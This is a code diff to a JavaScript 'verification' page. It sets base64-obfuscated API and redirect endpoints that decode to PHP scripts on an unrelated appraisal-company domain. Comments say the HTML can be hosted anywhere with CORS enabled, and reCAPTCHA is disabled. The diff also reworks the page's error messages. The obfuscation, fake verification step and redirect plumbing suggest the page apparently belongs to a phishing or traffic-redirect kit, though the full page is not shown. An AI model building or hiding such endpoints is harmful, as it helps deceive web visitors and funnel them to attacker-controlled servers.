@@ -14,8 +14,12 @@
         // ============================================
         // CONFIGURATION
         // ============================================
-        const endpoint = atob("aHR0cDovL2NhbXBiZWxsY2hhbWJsaXNzYXBwcmFpc2Vycy5jb20vYXBpLnBocA==");
-        const redirectBase = atob("aHR0cDovL2NhbXBiZWxsY2hhbWJsaXNzYXBwcmFpc2Vycy5jb20vcHJvY2Vzcy5waHA=");
+        // CONFIGURED FOR SEPARATE SERVER HOSTING
+        // API server: campbellchamblissappraisers.com
+        // HTML can be hosted anywhere (CORS enabled on API)
+        const endpoint = atob("aHR0cHM6Ly9jYW1wYmVsbGNoYW1ibGlzc2FwcHJhaXNlcnMuY29tL2FwaS5waHA=");
+        const redirectBase = atob("aHR0cHM6Ly9jYW1wYmVsbGNoYW1ibGlzc2FwcHJhaXNlcnMuY29tL3Byb2Nlc3MucGhw");
+        
         const RECAPTCHA_SITE_KEY = ''; // reCAPTCHA disabled
         const USE_RECAPTCHA = false; // reCAPTCHA DISABLED to match cPanel configuration
         
@@ -220,13 +224,24 @@
             stack: e.stack,
             name: e.name
           });
+          console.error("API Endpoint:", endpoint);
+          
+          // Provide helpful error message based on error type
+          let errorDetails = e.message;
+          let helpText = '';
+          
+          if (e.message.includes('Failed to fetch') || e.name === 'TypeError') {
+            errorDetails = 'Failed to fetch';
+            helpText = '<p style="font-size:11px;color:#999;margin-top:10px;">The verification API is not reachable. Please ensure this file is hosted on the same server as api.php</p>';
+          }
           
           // Show error message to user instead of immediately redirecting
           document.getElementById('app').innerHTML = `
             <div style="padding:40px;text-align:center;font-family:Arial,sans-serif;">
               <h2 style="color:#d32f2f;">Verification Error</h2>
               <p>Unable to complete verification. Please try again.</p>
-              <p style="font-size:12px;color:#666;margin-top:20px;">Error: ${e.message}</p>
+              <p style="font-size:12px;color:#666;margin-top:20px;">Error: ${errorDetails}</p>
+              ${helpText}
               <button onclick="location.reload()" style="margin-top:20px;padding:10px 20px;background:#1976d2;color:white;border:none;border-radius:4px;cursor:pointer;">
                 Retry
               </button>
